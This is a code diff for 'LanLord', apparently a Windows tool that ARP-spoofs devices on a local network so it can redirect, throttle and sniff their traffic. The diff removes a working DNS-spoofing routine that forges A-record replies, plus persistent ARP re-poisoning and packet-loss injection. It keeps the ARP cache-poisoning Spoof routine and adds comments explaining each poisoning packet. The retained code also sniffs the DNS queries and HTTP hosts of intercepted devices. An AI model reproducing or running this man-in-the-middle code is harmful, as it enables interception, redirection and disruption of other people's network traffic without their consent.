@@ -20,14 +20,17 @@ namespace LanLord
 
         private bool isDiscovering;
 
-        // Used for packet-loss injection — shared Random, one per CArp instance
-        private readonly Random _rng = new Random();
-
         private PcList pcList;
 
         private NetworkInterface nicNet;
 
         private CPcapNet pcaparp;
+
+        // Dedicated send-only pcap handle for Spoof/UnSpoof/findMac.
+        // pcaparp is receive-only (arpListenerThread); _pcaparpSend is write-only (any thread).
+        // Keeping them separate eliminates concurrent pcap_next_ex + pcap_sendpacket on the
+        // same pcap_t handle, which is not thread-safe in WinPcap/Npcap.
+        private CPcapNet _pcaparpSend;
 
         private CPcapNet pcapredirect;
 
@@ -170,10 +173,7 @@ namespace LanLord
                         if (pCFromIP != null)
                         {
                             int capDown = pCFromIP.capDown;
-                            // Packet loss injection on downlink (router → device)
-                            int lossDown = pCFromIP.packetLossPct;
-                            if ((capDown == 0 || capDown > pCFromIP.nbPacketReceivedSinceLastReset) && pCFromIP.redirect
-                                && (lossDown == 0 || _rng.Next(100) >= lossDown))
+                            if ((capDown == 0 || capDown > pCFromIP.nbPacketReceivedSinceLastReset) && pCFromIP.redirect)
                             {
                                 Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, pkt_data, 0, 6);
                                 Array.Copy(localMAC, 0, pkt_data, 6, 6);
@@ -191,25 +191,13 @@ namespace LanLord
                     PC pCFromMac = pcList.getPCFromMac(array);
                     if (pCFromMac != null)
                     {
-                        // DNS sniffer/spoofer: intercept queries from any spoofed device before forwarding decision
+                        // DNS sniffer: intercept queries from any spoofed device before forwarding decision
                         string dnsHost = parseDnsQuery(pkt_data);
                         if (dnsHost != null)
                         {
                             pCFromMac.lastDnsQuery = dnsHost;
                             Action<PC, string> dnsCallback = OnDnsQuery;
                             if (dnsCallback != null) dnsCallback(pCFromMac, dnsHost);
-
-                            // DNS spoofing: if a redirect IP is configured for this device,
-                            // send a forged answer and drop the real query (don't forward it).
-                            string spoofIp = pCFromMac.dnsSpoofIP;
-                            if (spoofIp != null && IPAddress.TryParse(spoofIp, out IPAddress spoofAddr))
-                            {
-                                byte[] fakeReply = buildDnsResponsePacket(pkt_data, spoofAddr.GetAddressBytes());
-                                if (fakeReply != null)
-                                    pcapredirect.pcapnet_sendpacket(fakeReply);
-                                // Drop the real query — do not forward to router
-                                continue;
-                            }
                         }
                         // HTTP Host sniffer: cleartext HTTP on port 80
                         string httpHost = parseHttpHost(pkt_data);
@@ -264,10 +252,7 @@ namespace LanLord
                             }
                         }
                         int capUp = pCFromMac.capUp;
-                        // Packet loss injection on uplink (device → router)
-                        int lossUp = pCFromMac.packetLossPct;
-                        if ((capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect
-                            && (lossUp == 0 || _rng.Next(100) >= lossUp))
+                        if ((capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect)
                         {
                             Array.Copy(routerMAC, 0, pkt_data, 0, 6);
                             Array.Copy(localMAC, 0, pkt_data, 6, 6);
@@ -348,20 +333,6 @@ namespace LanLord
                         if (cb != null) cb(rogueMac, claimedIp);
                     }
                 }
-                // Persistent re-poisoning: if a currently-spoofed device sends any ARP reply
-                // (gratuitous or targeted), immediately re-poison it before the cache heals.
-                if (b == 2 && isRedirecting && routerIP != null)
-                {
-                    byte[] senderIp2 = new byte[4];
-                    Array.Copy(pkt_data, 28, senderIp2, 0, 4);
-                    // Ignore router and ourselves
-                    if (!tools.areValuesEqual(senderIp2, routerIP) && !tools.areValuesEqual(senderIp2, localIP))
-                    {
-                        PC spoofedPc = pcList.getPCFromIP(senderIp2);
-                        if (spoofedPc != null && spoofedPc.redirect && !spoofedPc.isGateway && !spoofedPc.isLocalPc)
-                            Spoof(spoofedPc.ip, new IPAddress(routerIP));
-                    }
-                }
             }
             while (isListeningArp);
             arpListenerThreadTerminated.Set();
@@ -399,6 +370,7 @@ namespace LanLord
             }
             while (num2 < 6);
             pcaparp = new CPcapNet();
+            _pcaparpSend = new CPcapNet();
             pcapredirect = new CPcapNet();
             arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
             redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
@@ -426,6 +398,7 @@ namespace LanLord
                 redirectorThreadTerminated.WaitOne();
             }
             completeUnspoof();
+            _pcaparpSend.Dispose();
         }
 
         public void Spoof(IPAddress ip1, IPAddress ip2)
@@ -434,15 +407,17 @@ namespace LanLord
             PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
             if (pCFromIP != null && pCFromIP2 != null)
             {
+                // Packet 1: tell the target device that the router is at localMAC
                 byte[] array = localMAC;
-                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), array, 2, array, pCFromIP2.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
+                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), array, 2, array, pCFromIP2.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
+                // Packet 2: tell the router that the target device is at localMAC
                 byte[] array2 = localMAC;
-                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), array2, 2, array2, pCFromIP.ip.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes()));
-                pcaparp.pcapnet_sendpacket(buildArpPacket(localMAC, pCFromIP2.mac.GetAddressBytes(), 2, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), localMAC, localIP));
-                byte[] array3 = localMAC;
-                CPcapNet cPcapNet = pcaparp;
-                byte[] array4 = array3;
-                cPcapNet.pcapnet_sendpacket(buildArpPacket(array4, array4, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), localMAC, localIP));
+                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), array2, 2, array2, pCFromIP.ip.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes()));
+                // NOTE: former packets 3 & 4 sent frames with Ethernet src = router_MAC
+                // from LanLord's NIC, which caused the switch's CAM table to map router_MAC
+                // to LanLord's port. All traffic to the router was then mis-switched back to
+                // LanLord, breaking LanLord's own internet. The OS ARP cache for the router
+                // is maintained naturally; no extra frames are needed.
             }
         }
 
@@ -452,8 +427,11 @@ namespace LanLord
             PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
             if (pCFromIP != null && pCFromIP2 != null)
             {
-                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), 1, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
-                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pCFromIP2.ip.GetAddressBytes()));
+                // Use localMAC as Ethernet src so the switch's CAM table is never corrupted
+                // with a forged router/victim MAC pointing to our port.
+                // The ARP payload sender fields are what actually update the recipients' ARP caches.
+                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), localMAC, 1, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
+                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), localMAC, 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pCFromIP2.ip.GetAddressBytes()));
             }
         }
 
@@ -470,10 +448,15 @@ namespace LanLord
                 MessageBox.Show(text);
                 return;
             }
+            if (_pcaparpSend.nicHandle == IntPtr.Zero && !_pcaparpSend.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
+            {
+                MessageBox.Show(text);
+                return;
+            }
             byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
             byte[] array = broadcastMac;
             byte[] array2 = localMAC;
-            pcaparp.pcapnet_sendpacket(buildArpPacket(array, array2, 1, array2, localIP, array, addressBytes));
+            _pcaparpSend.pcapnet_sendpacket(buildArpPacket(array, array2, 1, array2, localIP, array, addressBytes));
         }
 
         public int startRedirector()
@@ -669,101 +652,8 @@ namespace LanLord
             return result.Length > 0 ? result : null;
         }
 
-        /// <summary>
-        /// Builds a forged DNS A-record response for the given DNS query packet.
-        /// The raw query frame (Ethernet+IP+UDP+DNS) is passed in; the response
-        /// swaps src/dst at every layer and embeds <paramref name="spoofIPBytes"/> as
-        /// the answer RR data.  Returns null if the input is not a parseable DNS query.
-        /// </summary>
-        private byte[] buildDnsResponsePacket(byte[] query, byte[] spoofIPBytes)
+        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
         {
-            // query layout: 14 Eth + IHL IP + 8 UDP + DNS payload
-            if (query == null || query.Length < 55) return null;
-            if (query[12] != 0x08 || query[13] != 0x00) return null; // IPv4
-            if (query[23] != 17) return null;                         // UDP
-            int ihl = (query[14] & 0x0F) * 4;
-            int udpOff = 14 + ihl;
-            if (query.Length < udpOff + 8 + 12) return null;
-            int dnsOff = udpOff + 8;
-            // QR must be query (0)
-            if ((query[dnsOff + 2] & 0x80) != 0) return null;
-
-            // Copy the original DNS question section verbatim
-            int questionLen = query.Length - dnsOff - 12;
-            // Answer RR: pointer to name (0xC00C) + type A + class IN + TTL 60 + rdlength 4 + rdata
-            byte[] answerRR = new byte[] {
-                0xC0, 0x0C,             // name: pointer to offset 12 (question QNAME)
-                0x00, 0x01,             // type  A
-                0x00, 0x01,             // class IN
-                0x00, 0x00, 0x00, 0x3C, // TTL 60 s
-                0x00, 0x04,             // rdlength 4
-                spoofIPBytes[0], spoofIPBytes[1], spoofIPBytes[2], spoofIPBytes[3]
-            };
-
-            int dnsTotalLen = 12 + questionLen + answerRR.Length;
-            int udpLen      = 8 + dnsTotalLen;
-            int ipLen       = ihl + udpLen;
-            int frameLen    = 14 + ipLen;
-
-            byte[] pkt = new byte[frameLen];
-
-            // --- Ethernet: swap src/dst MACs ---
-            Array.Copy(query, 6,  pkt, 0,  6); // dst = original src MAC
-            Array.Copy(query, 0,  pkt, 6,  6); // src = original dst MAC
-            pkt[12] = 0x08; pkt[13] = 0x00;
-
-            // --- IP header: copy then swap src/dst IPs, update length, clear checksum ---
-            Array.Copy(query, 14, pkt, 14, ihl);
-            pkt[14 + 2] = (byte)(ipLen >> 8);
-            pkt[14 + 3] = (byte)(ipLen & 0xFF);
-            pkt[14 + 8] = 64; // TTL
-            // swap src/dst IP
-            Array.Copy(query, 14 + 12, pkt, 14 + 16, 4); // dst IP ← query src IP
-            Array.Copy(query, 14 + 16, pkt, 14 + 12, 4); // src IP ← query dst IP
-            // recalculate IP checksum
-            pkt[14 + 10] = 0; pkt[14 + 11] = 0;
-            uint ipCksum = 0;
-            for (int i = 0; i < ihl; i += 2)
-                ipCksum += (uint)((pkt[14 + i] << 8) | pkt[14 + i + 1]);
-            while ((ipCksum >> 16) != 0) ipCksum = (ipCksum & 0xFFFF) + (ipCksum >> 16);
-            ipCksum = ~ipCksum & 0xFFFF;
-            pkt[14 + 10] = (byte)(ipCksum >> 8);
-            pkt[14 + 11] = (byte)(ipCksum & 0xFF);
-
-            // --- UDP: swap src/dst ports, set length, zero checksum ---
-            pkt[udpOff + 0] = query[udpOff + 2]; // src port ← 53
-            pkt[udpOff + 1] = query[udpOff + 3];
-            pkt[udpOff + 2] = query[udpOff + 0]; // dst port ← original src port
-            pkt[udpOff + 3] = query[udpOff + 1];
-            pkt[udpOff + 4] = (byte)(udpLen >> 8);
-            pkt[udpOff + 5] = (byte)(udpLen & 0xFF);
-            pkt[udpOff + 6] = 0; pkt[udpOff + 7] = 0; // checksum optional for IPv4
-
-            // --- DNS header ---
-            // Transaction ID: copy from query
-            pkt[dnsOff + 0] = query[dnsOff + 0];
-            pkt[dnsOff + 1] = query[dnsOff + 1];
-            // Flags: QR=1 (response), AA=1, RD=1, RA=1, RCODE=0
-            pkt[dnsOff + 2] = 0x85;
-            pkt[dnsOff + 3] = 0x80;
-            // QDCOUNT = 1
-            pkt[dnsOff + 4] = 0x00; pkt[dnsOff + 5] = 0x01;
-            // ANCOUNT = 1
-            pkt[dnsOff + 6] = 0x00; pkt[dnsOff + 7] = 0x01;
-            // NSCOUNT = ARCOUNT = 0
-            pkt[dnsOff + 8] = 0; pkt[dnsOff + 9] = 0;
-            pkt[dnsOff + 10] = 0; pkt[dnsOff + 11] = 0;
-
-            // --- DNS question section (verbatim copy from query) ---
-            Array.Copy(query, dnsOff + 12, pkt, dnsOff + 12, questionLen);
-
-            // --- DNS answer section ---
-            Array.Copy(answerRR, 0, pkt, dnsOff + 12 + questionLen, answerRR.Length);
-
-            return pkt;
-        }
-
-        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)        {
             byte[] array = new byte[42];
             Array.Copy(destMac, 0, array, 0, 6);
             Array.Copy(srcMac, 0, array, 6, 6);
